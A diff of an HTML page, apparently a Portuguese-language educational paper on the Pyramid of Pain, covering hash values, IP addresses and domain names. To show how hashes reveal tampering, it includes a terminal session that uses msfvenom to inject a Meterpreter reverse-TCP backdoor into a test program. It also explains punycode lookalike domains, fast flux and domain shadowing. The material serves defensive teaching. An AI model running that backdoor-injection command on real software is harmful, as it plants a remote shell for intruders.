@@ -3,9 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+
     <link rel="stylesheet" href="../src/css/global.css">
     <link rel="stylesheet" href="../src/css/papers.css">
-    <title>Pyramid Of Pain: a Cybersecurity Tool</title>
+    <title>4Forward - Pyramid Of Pain: a Cybersecurity Tool</title>
 </head>
 <body>
     <nav class="nav">
@@ -16,84 +20,175 @@
     <main>
         <header class="color-green">
             <pre class="ASCII">
-__________________¶________________¶
-_________________¶¶________________¶¶
-_______________¶¶¶__________________¶¶¶
-_____________¶¶¶¶____________________¶¶¶¶
-____________¶¶¶¶¶____________________¶¶¶¶¶
-___________¶¶¶¶¶______________________¶¶¶¶¶
-__________¶¶¶¶¶¶______________________¶¶¶¶¶¶
-__________¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶
-__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
-___________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
-____________¶¶¶¶¶¶¶¶____¶¶¶¶¶¶____¶¶¶¶¶¶¶¶
-___¶________¶¶¶¶¶¶¶______¶¶¶¶______¶¶¶¶¶¶¶
-___¶_______¶¶¶¶¶¶¶¶___O_¶¶¶¶¶__O__¶¶¶¶¶¶¶¶
-__¶¶¶______¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶
-__¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
-_¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶
-_¶¶¶¶¶____¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶
-___¶¶_____¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶
-___¶¶______¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶
-____¶¶______¶¶________¶¶¶¶¶¶¶¶¶¶_______¶¶
-_____¶¶______¶¶¶_______________________¶
-_____¶¶________¶¶____¶¶¶¶¶¶¶¶¶¶¶______¶
-______¶¶________¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶__¶
-_______¶¶__________¶¶¶_____¶¶¶¶¶¶¶¶¶¶
-_________¶¶___________¶¶¶¶¶__¶¶¶¶¶¶¶¶¶
-_____________________________¶¶¶¶¶¶¶¶¶¶
-______________________________¶¶¶¶¶¶¶¶¶
-_______________________________¶¶¶¶¶¶¶
+                  ######                          
+                  ######            ########       
+                ########          ##############  
+              ############          ############  
+            ##############          ######        
+        ####################    ########          
+      ##################################          
+        ################################          
+    ##  ################################          
+        ##############################            
+        ########  ##################                      ,*-.               
+        ########        ##########                        |  |
+      ##########      ####  ######                    ,.  |  | 
+    ####    ##          ##    ##                      | |_|  | ,.
+    ####    ##          ##    ####                    `---.  |_| |
+      ##      ##        ##      ##                        |  .--`
+      ##      ####    ######    ##                        |  |
+      ####                      ######                    |  |
+—————————————————————————————————————————————————————————————————————————
             </pre>
         </header>
 
-        <h1>:: Pyramid Of Pain: a Cybersecurity Tool ::</h1>
+        <h3>[ Pyramid Of Pain: a Cybersecurity Tool ]</h3>
+        <br>
         <summary class="color-violet font-weight-700">
             <pre>
-═════ SUMMARY ════╗
-<a href="#introduction"><b>[1]</b> Introduction</a>
-<a href="#hash-values"><b>[2]</b> Hash Values</a>
-<a href="#IP-addresses"><b>[3]</b> IP Addresses</a>
-<a href="#domain-names"><b>[4]</b> Domain Names</a>
-<a href="#conclusion"><b>[5]</b> Conclusion</a>
-══════════════════╝
++----------------------------+
+|                            |
+|  <a href="#introduction"><b>[01]</b> - Introdução</a>         |
+|  <a href="#hash-values"><b>[02]</b> - Valores de Hash</a>    |
+|  <a href="#IP-addresses"><b>[03]</b> - Endereços IP</a>       |
+|  <a href="#domain-names"><b>[04]</b> - Nomes de Domínios</a>  |
+|  <a href="#conclusion"><b>[05]</b> - Conclusão</a>          |
+|                            |
++----------------------------+
             </pre>
         </summary>
             <div class="content">
                 <ul>
                     <li id="introduction">
-                        <h2>:: [1] Introduction</h2>
+                        <h3>[ Introdução ]</h3>
                         <p>
-                            The Pyramid of Pain is a famous conceptual tool in the field of cybersecurity. It helps security teams understand and prioritize the threats they face. In this paper, we will explore three main components of the pyramid: Hash Values, IP Addresses and Domain Names.
+                            A pirâmide de dor (Pyramid of Pain) é uma ferramenta conceitual famosa na área de cibersegurança. Ela ajuda as equipes de segurança a entender e priorizar as ameaças enfrentadas. Neste paper, vamos explorar três principais componentes da pirâmide: Hash Values, IP Addresses e Domain Names.
                         </p>
                     </li>
                     <li id="hash-values">
-                        <h2>:: [2] Hash Values</h2>   
+                        <h3>[ Valores de Hash ]</h3>   
                         <p>
-                            Hash values ​​are at the base of the pain pyramid. They are relatively easy to change and therefore don't cause much "pain" to attackers when they are discovered and blocked. However, even though they are low-level, they are still useful for detecting malicious activity, especially when combined with other information.
+                            Hash Values, também conhecida como valores de hash, são sequências de caracteres fixas e únicas de cada arquivo, texto, etc. Os valores de hash estão na base da pirâmide da dor, e ele será um grande aliado na verificação da integridade dos dados e verificação de malware.
+                        </p>
+                        <p>
+                            Por está na base da pirâmide, as hash não causam muita "dor” aos APT quando são descobertos e bloqueados. Porém, mesmo sendo de baixo nível, ainda são muito úteis.
+                        </p>
+
+                        <br><h3>&gt; Integridade &lt;</h3>
+                        <p class="sub-topic">
+                            Para verificar a integridade dos dados eu irei utilizar um simples programa que criei em C++.
+                        </p>
+                        <pre class="medium-frame-terminal sub-topic">
++---[ main.cpp ]-------------------------------------------------------------------+
+| #include &lt;iostream&gt;                                                              |
+|                                                                                  |
+| int main() {                                                                     |
+|   std::cout &lt;&lt; "This is a simple program that will be infected." &lt;&lt; std::endl;   |
+| return 0;                                                                        |
+| }                                                                                |
++----------------------------------------------------------------------------------+
+                        </pre>
+                        <p class="sub-topic">
+                            Como primeiro passo dessa demonstração irei compilar o meu programa, e logo em seguida irei gerar o hash MD5 utilizando o comando "md5sum”.
+                        </p>
+                        <p class="sub-topic">
+                            Depois de ter gerado a hash irei utilizar o msfvenom para poder gerar o backdoor e infectar o meu programa, dessa forma você poderá vê que o hash do programa original é completamente diferente do hash do programa infectado.
+                        </p>
+                        <pre class="medium-frame-terminal sub-topic">
++---[ terminal ]---------------------------------------------------------------------+
+| <span class="color-red small-frame-terminal">blackcrw@4forward:~/$</span> g++ main.cpp -o program                                      |
+| <span class="color-red small-frame-terminal">blackcrw@4forward:~/$</span> md5sum program                                               |
+| c401bd76aecd9bd018bd0272baf729c3  program                                          |
+| <span class="color-red small-frame-terminal">blackcrw@4forward:~/$</span> msfvenom -x program -p windows/x64/meterpreter/reverse_tcp \ |
+| lhost=172.17.0.2 lport=4444 R&gt; program_infected                                    |
+| <span class="color-red small-frame-terminal">blackcrw@4forward:~/$</span> md5sum program program_infected                              |
+| c401bd76aecd9bd018bd0272baf729c3  program                                          |
+| 6a770327f49be5cbb9684ceb1307e504  program_infected                                 |
++------------------------------------------------------------------------------------+
+                        </pre>
+                        <p class="sub-topic">
+                            Observe que o hash do programa original para o programa infectado é completamente diferente, e isso significa que o programa foi alterado, independente de ter sido uma vírgula ou um ponto a mais. Nós não podemos confiar mais na integridade do programa, pois foi violada.
+                        </p>
+                        <p class="sub-topic">
+                            É pelo motivo de verificar a integridade do programa que se deixa os hash do programa original disponível na página de download.
+                        </p>
+
+                        <br><h3>&gt; Verificação de malware com hash &lt;</h3>
+                        <p class="sub-topic">
+                            Após verificarmos que a integridade foi violada, podemos utilizar ferramentas como o VírusTotal para realizar uma pesquisa no hash do programa infectado, de modo a identificar se esse hash já foi catalogado por outra equipe de Blue Team, e quando foi a primeira detecção.
+                        </p>
+                        <p class="sub-topic">
+                            Caso não tenha sido catalogado por ninguém, podemos enviar uma amostra do programa infectado para que VírusTotal realize testes do malware em diversos antivírus.
+                        </p>
+                        <p class="sub-topic">
+                            <a href="https://www.virustotal.com/gui/file/8580ec19859958f5b5aced230133521a5c37cb7d59e708b7ea02dcf6e5b33e90">https://www.virustotal.com/gui/file/8580ec19859958f5b5aced230133521a5c37cb7d59e708b7ea02dcf6e5b33e90</a>
+                        </p>
+                        <p class="sub-topic">
+                            Note que alguns antivírus definiram nosso programa infectado como um malware.
                         </p>
                     </li>
                     <li id="IP-addresses">
-                        <h2>:: [3] IP Addresses</h2>
+                        <h3>[ Endereços IP ]</h3>
                         <p>
-                            IP addresses are one step above hash values ​​in the pyramid. IP addresses can provide information about the attacker's geographic location as well as the infrastructure used in the attack. However, just like hash values, IP addresses can also be easily changed or disguised by attackers.
+                            Os endereços IP estão um passo acima dos hash values na pirâmide e são as impressões digitais dos dispositivos na internet. Eles podem ajudar a rastrear a localização geográfica e a infraestrutura usada pelo atacante, mas só se o hacker não estiver escondendo seus rastros. Usar proxys e VPNs é praticamente um passe livre para burlar isso e manter a identidade anônima.
+                        </p>
+
+                        <br><h3>&gt; Fast Flux &lt;</h3>
+                        <p class="sub-topic">
+                            Uma técnica que os atacantes usam, eles mudam basicamente os endereços IP associados a um domínio em intervalos rápidos para evitar serem pegos. É tipo um jogo de esconde-esconde.
+                        </p>
+                        <p class="sub-topic">
+                            Se você realmente quer entender mais sobre esses esquemas malucos que os hackers usam, o artigo da Unit 42 é uma ótima opção.
+                        </p>
+                        <p class="sub-topic">
+                            <a href="https://unit42.paloaltonetworks.com/fast-flux-101">https://unit42.paloaltonetworks.com/fast-flux-101</a>
+                        </p>
+
+                        <br><h3>&gt; Redes Botnet &lt;</h3>
+                        <p class="sub-topic">
+                            Os atacantes podem invadir outras máquinas reais, de usuários comuns, e utilizar elas para passar todo o tráfego da rede deles. Dificultando a detecção por parte das defesas baseadas em reputação de IP.
                         </p>
                     </li>
                     <li id="domain-names">
-                        <h2>:: [4] Domain Names</h2>
-                        <p>Domain names are even higher up the pyramid and are more difficult to change than hash values ​​and IP addresses. Attackers often register their own domains to use in attacks, so discovering and blocking a malicious domain name can cause a significant amount of "pain" to the attacker.</p>
+                        <h3>[ Nome de Domínios ]</h3>
+                        <p>
+                            Os nomes de domínio estão ainda mais acima na pirâmide e são mais difíceis de alterar do que os valores de hash e os endereços IP. Os atacantes muitas vezes registram seus próprios domínios para usar em ataques, portanto, a descoberta e o bloqueio de um nome de domínio malicioso podem causar uma quantidade significativa de “dor” ao atacante.
+                        </p>
+                        <p>
+                            Modificar domínios requer tempo, às vezes dinheiro, e criatividade dos atacantes. Eles precisam registrar novos domínios, configurar DNS e se manter sem chamar muita atenção. Cada vez que derrubamos um domínio, é como se fosse um soco nos atacantes.
+                        </p>
 
+                        <br><h3>&gt; Domain Shadowing &lt;</h3>
+                        <p class="sub-topic">
+                            Criação de subdomínios maliciosos que são difíceis de detectar e rastrear. Esta técnica envolve a obtenção de acesso não autorizado a contas de registradores de domínios e a criação de subdomínios sem o conhecimento do proprietário do domínio.
+                        </p>
+
+                        <br><h3>&gt; Punycode Attack &lt;</h3>
+                        <p class="sub-topic">
+                            A chave mestra para fazer um domínio malicioso parecer legítimo. É uma forma de enfiar caracteres de outras línguas dentro de URLs.
+                        </p>
+                        <p class="sub-topic">
+                            Resumindo a técnica de forma menos complexa, os atacantes podem criar um domínio extremamente parecido com domínios verdadeiros, como, por exemplo: “аррӏе.com” em vez de “apple.com” (os copie e cole em seu navegador que verá a diferença). Atores maliciosos adoram utilizar esta técnica para ataques de phishing.
+                        </p>
+
+                        <br><h3>&gt; Encurtador de URL &lt;</h3>
+                        <p class="sub-topic">
+                            Muitos atores maliciosos também escondem as URLs maliciosas em encurtadores de links, fazendo assim com que os mais leigos/desavisados caiam nesta jogada.
+                        </p>
+
+                        <br>
+                        <p>Além dessas técnicas citadas acima, os atores maliciosos podem combinar todas juntas.</p>
                     </li>
                     <li id="conclusion">
-                        <h2>:: [5] Conclusion</h2>
-                        <p>The Pyramid of Pain is a valuable tool for cybersecurity teams as it helps prioritize defensive actions based on the level of "pain" each action will cause to the attacker. By understanding the components of the pyramid, security teams can craft more effective and focused strategies to protect their systems and data.</p>
+                        <h3>[ Conclusão ]</h3>
+                        <p>
+                            A Pyramid of Pain é uma ferramenta valiosa para as equipes de cibersegurança, por ajudar a priorizar as ações de defesa com base no nível de “dor” que cada ação causará ao atacante. Ao entender os componentes da pirâmide, as equipes de Blue Team podem elaborar estratégias mais eficazes e focadas para proteger seus sistemas e dados.
+                        </p>
                     </li>
                 </ul>
                 <footer>
                     <pre class="paper-text">
-+----------------+
-| <b>Github:</b> <a href="https://github.com/blkzy" target="_blank">blkzy</a>  |
-+----------------+
+[ <a href="https://4forward-secure.github.io/members/blkzy.html" target="_blank">@blkz</a> ] [ <a href="https://github.com/blkzy" target="_blank">github</a> ]
                     </pre>
                 </footer>
             </div>
